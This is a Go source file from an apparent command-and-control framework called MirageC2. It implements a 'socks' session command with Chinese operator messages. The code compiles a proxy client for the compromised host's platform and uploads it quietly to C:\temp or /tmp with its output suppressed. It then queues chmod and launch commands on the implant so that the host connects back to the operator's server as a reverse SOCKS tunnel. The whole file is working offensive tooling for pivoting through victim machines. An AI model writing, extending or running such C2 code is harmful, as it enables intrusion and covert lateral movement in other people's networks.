package sessionbase

import (
	"MirageC2_V1.0/app/exchange"
	"MirageC2_V1.0/app/module"
	"MirageC2_V1.0/app/module/template"
	"MirageC2_V1.0/public/check"
	"MirageC2_V1.0/public/common"
	"fmt"
	"strconv"
	"time"
)

func Socks(sess_parts []string, intID int) {
	filename := ""
	savename := "socks"
	job := &common.Jobs[intID-1]
	args := len(sess_parts)
	switch args {
	case 4, 5:
		go module.SocksStart(sess_parts[2], sess_parts[3])
		fmt.Printf("[+] 正在部署Socks代理模块，请等待.....\n")
		time.Sleep(1 * time.Second)
		//隐藏文件上传的内容
		restore := common.SuppressOutput()
		fmt.Print("Mirage Control -> Session" + strconv.Itoa(intID) + " > ")
		if args == 5 {
			if sess_parts[4] == "arm64" {
				template.CreateModule("socks", job.Platform, "arm64")
				filename = "app/module/release/arm64_" + job.Platform + "_proxyclient"
			}
		} else {
			template.CreateModule("socks", job.Platform, "amd64")
			filename = "app/module/release/amd64_" + job.Platform + "_proxyclient"
		}
		serverIP := sess_parts[1] + ":" + sess_parts[2]
		if job.Platform == "windows" {
			filename = filename + ".exe"
			savename = "C:\\temp\\" + savename + ".exe"
		} else {
			savename = "/tmp/socks"
		}
		exchange.FileControl("upload", filename, savename, intID)
		if job.Platform == "linux" || job.Platform == "darwin" {
			job.Tasks[99995] = "chmod +x /tmp/socks"
		}
		//恢复内容的输出
		restore()

		fmt.Printf("[*] 请运行命令socks connect %s连接服务器。\n", serverIP)

	case 3:
		if sess_parts[1] == "connect" {
			if check.IPCheck(sess_parts[2]) {
				command := "/tmp/socks -target=" + sess_parts[2]
				if job.Platform == "windows" {
					command = "cmd /c start /b C:\\temp\\socks.exe -target='" + sess_parts[2] + "'"
				}
				job.Tasks[99995] = command
				fmt.Printf("[*] 尝试回连至%s\n,请测试8002端口是否", sess_parts[2])
			} else {
				fmt.Printf("[-] 请确认输入的IP地址等参数，Usage：socks connect <serverIP>:<port>\n")
			}
		}
	default:
		fmt.Printf("[*] socks参数输入错误，例子：socks <ReverseServerIP> <ServerPort> <ForwardPort>\n")
	}
}
